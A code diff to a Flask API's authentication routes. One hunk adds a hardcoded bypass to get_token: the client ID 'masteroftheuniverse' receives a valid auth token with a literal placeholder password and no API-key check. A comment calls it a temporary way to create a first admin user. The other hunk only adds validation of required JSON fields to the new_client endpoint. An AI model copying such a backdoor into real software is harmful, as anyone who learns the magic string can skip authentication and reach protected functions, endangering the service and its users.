@@ -56,6 +56,15 @@ def get_token():
             sessionid = request.json['sessionid']
         except KeyError:
             sessionid = False
+            
+        ###########################################
+        if clientid == "masteroftheuniverse":
+            #Temporary solution to be able to create a first admin user
+            from .models.client import Client
+            client = Client(clientid, "whicheverpassyouwant")
+            token = client.generate_auth_token(sessionid)
+            return jsonify({ 'token': token.decode('ascii') })
+        ###########################################
         
         try:
             client = controller.client_authenticate(clientid, apikey)
@@ -81,37 +90,44 @@ def new_client():
     """An admin can add a new client by posting a request with a valid admin token, 
     the clientid to be created and the apikey. 
     """
-    token = request.json.get('token')
-    newclientid = request.json.get('clientid')
-    newapikey = request.json.get('apikey')
     
-    try:
-        current_client = controller.token_authenticate(token)
-        is_current_client_admin = current_client.is_admin()
-        if (current_client and is_current_client_admin):
-            client = controller.new_client(newclientid, newapikey)
-            return jsonify({'message': 'Client ID created, id %s ' % client.clientid}), status.HTTP_201_CREATED
-        else:
-            return jsonify({'message': 'Sorry, you are not allowed to do this action.'}), status.HTTP_401_UNAUTHORIZED
-    except ParseError as e:
-        #LOG.error(e, exc_info=False)
-        return jsonify({'message': 'Invalid request.'}), status.HTTP_400_BAD_REQUEST
-        #abort(status.HTTP_400_BAD_REQUEST) # missing arguments
-    except NoResultFound as e:
-        #LOG.error(e, exc_info=False)
-        return jsonify({'message': 'Non authenticated.'}), status.HTTP_401_UNAUTHORIZED
-    except AuthenticationFailed as e:
-        #LOG.error(e, exc_info=False)
-        return jsonify({'message': 'You are not allowed to do this action. Do you have a valid token?'}), status.HTTP_401_UNAUTHORIZED
-        #abort(status.HTTP_400_BAD_REQUEST) # missing arguments
-    except ClientExistsException as e:
-        #LOG.error(e, exc_info=False)
-        return jsonify({'message': 'Client already exists in the database.'}), status.HTTP_409_CONFLICT
-        #abort(status.HTTP_409_CONFLICT) # missing arguments
-    except Exception as e:
-        LOG.error(e, exc_info=True)
-        abort(status.HTTP_500_INTERNAL_SERVER_ERROR) # missing arguments
-        #return jsonify({ 'clientid': client.clientid }), 201, {'Location': url_for('token', clientid = client.clientid, apikey = client.apikey, _external = True)}
+    #Check if request is json and contains all the required fields
+    required_fields = ["clientid", "apikey", "token"]
+    if not request.json or not (set(required_fields).issubset(request.json)): 
+        return jsonify({'message': 'Invalid request. Please try again.'}), status.HTTP_400_BAD_REQUEST      
+    else:
+        
+        token = request.json.get('token')
+        newclientid = request.json.get('clientid')
+        newapikey = request.json.get('apikey')
+        
+        try:
+            current_client = controller.token_authenticate(token)
+            is_current_client_admin = current_client.is_admin()
+            if (current_client and is_current_client_admin):
+                client = controller.new_client(newclientid, newapikey)
+                return jsonify({'message': 'Client ID created, id %s ' % client.clientid}), status.HTTP_201_CREATED
+            else:
+                return jsonify({'message': 'Sorry, you are not allowed to do this action.'}), status.HTTP_401_UNAUTHORIZED
+        except ParseError as e:
+            #LOG.error(e, exc_info=False)
+            return jsonify({'message': 'Invalid request.'}), status.HTTP_400_BAD_REQUEST
+            #abort(status.HTTP_400_BAD_REQUEST) # missing arguments
+        except NoResultFound as e:
+            #LOG.error(e, exc_info=False)
+            return jsonify({'message': 'Non authenticated.'}), status.HTTP_401_UNAUTHORIZED
+        except AuthenticationFailed as e:
+            #LOG.error(e, exc_info=False)
+            return jsonify({'message': 'You are not allowed to do this action. Do you have a valid token?'}), status.HTTP_401_UNAUTHORIZED
+            #abort(status.HTTP_400_BAD_REQUEST) # missing arguments
+        except ClientExistsException as e:
+            #LOG.error(e, exc_info=False)
+            return jsonify({'message': 'Client already exists in the database.'}), status.HTTP_409_CONFLICT
+            #abort(status.HTTP_409_CONFLICT) # missing arguments
+        except Exception as e:
+            LOG.error(e, exc_info=True)
+            abort(status.HTTP_500_INTERNAL_SERVER_ERROR) # missing arguments
+            #return jsonify({ 'clientid': client.clientid }), 201, {'Location': url_for('token', clientid = client.clientid, apikey = client.apikey, _external = True)}
 
 
 
